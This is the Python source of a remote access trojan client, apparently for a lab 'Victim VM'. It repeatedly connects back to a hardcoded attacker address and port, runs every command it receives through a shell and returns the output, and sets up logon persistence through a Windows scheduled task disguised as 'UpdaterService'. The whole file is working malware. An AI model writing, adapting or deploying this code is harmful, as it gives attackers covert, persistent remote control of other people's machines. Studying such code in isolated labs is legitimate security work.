# rat_client.py (on Victim VM)
import socket
import subprocess
import os
import sys
import time
import random
import getpass

ATTACKER_IP = "192.168.56.102"
ATTACKER_PORT = 9999
BUFFER_SIZE = 4096
RECONNECT_DELAY = 5 
SIMULATE_DELAY = True
SIMULATE_STARTUP_DELAY = random.uniform(1, 5) 

def debug_print(message):

    print(f"[RAT] {message}")

def connect_to_server():
    """Attempts to connect to the RAT server."""
    sock = None
    while sock is None:
        try:
            debug_print(f"Attempting to connect to {ATTACKER_IP}:{ATTACKER_PORT}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ATTACKER_IP, ATTACKER_PORT))
            sock.settimeout(None) 
            debug_print("Connected to RAT server!")
        
            return sock
        except (socket.timeout, ConnectionRefusedError, socket.error) as e:
            debug_print(f"Connection failed ({e}). Retrying in {RECONNECT_DELAY}s...")
            sock = None
            time.sleep(RECONNECT_DELAY)
        except Exception as e:
            debug_print(f"Unexpected connection error: {e}. Retrying...")
            sock = None
            time.sleep(RECONNECT_DELAY)
    return sock 

def execute_command(command):
    """Executes a command and returns the output."""
    debug_print(f"Executing command: {command}")
    try:
       
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30 
        )
        output = result.stdout + result.stderr
        if not output:
             output = "[Command executed - No output]"
        return output
    except subprocess.TimeoutExpired:
        return "[Error: Command timed out after 30 seconds]"
    except Exception as e:
        return f"[Error executing command: {e}]"

def shedule_task_for_user():
    task_name = "UpdaterService"
    script_path = os.path.abspath("rat_client.py") 
    user = getpass.getuser()
    command = [
    "schtasks",
    "/Create",
    "/SC", "ONLOGON",               # Déclenchement : à l'ouverture de session
    "/TN", task_name,               # Nom de la tâche
    "/TR", f'"python3" "{script_path}"',      # Commande à exécuter
    "/RL", "LIMITED",               # Droits limités (pas admin)
    "/F",                           # Forcer la création si existe déjà
    "/RU", user                     # Compte utilisateur courant
]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Tâche planifiée créée avec succès.")
        else:
            print("[-] Erreur lors de la création :")
            print(result.stderr)
    except Exception as e:
        print(f"[-] Exception : {e}")



def main():
    debug_print("RAT Client started.")
    
    if SIMULATE_DELAY and SIMULATE_STARTUP_DELAY > 0:
        debug_print(f"Simulating startup delay ({SIMULATE_STARTUP_DELAY:.1f}s)...")
        time.sleep(SIMULATE_STARTUP_DELAY)

    shedule_task_for_user()
    sock = None
    try:
        while True:
            if sock is None:
                sock = connect_to_server()

            # Receive command
            try:
                data = sock.recv(BUFFER_SIZE)
                if not data :
                    debug_print("Server closed the connection.")
                    sock.close()
                    sock = None
                    time.sleep(RECONNECT_DELAY)
                    continue

                command = data.decode('utf-8', errors='ignore').strip()
                if not command:
                    continue

                debug_print(f"Received command: {repr(command)}")
                output = execute_command(command)
                response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
                sock.sendall(response.encode('utf-8', errors='ignore'))
                debug_print("Output sent back to server.")

            except socket.timeout:
                debug_print("Socket timeout (unexpected).")
                sock.close()
                sock = None
            except (ConnectionResetError, BrokenPipeError):
                debug_print("Connection to server lost.")
                sock.close()
                sock = None
                time.sleep(RECONNECT_DELAY)
            except Exception as e:
                debug_print(f"Error in main loop: {e}")
                try:
                    sock.close()
                except:
                    pass
                sock = None
                time.sleep(RECONNECT_DELAY)

    except KeyboardInterrupt:
        debug_print("Client stopped by user (Ctrl+C).")
    except Exception as e:
        debug_print(f"Unexpected error in main: {e}")
    finally:
        if sock:
            try:
                sock.close()
                debug_print("Socket closed.")
            except:
                pass
        debug_print("RAT Client exiting.")

if __name__ == "__main__":
    main()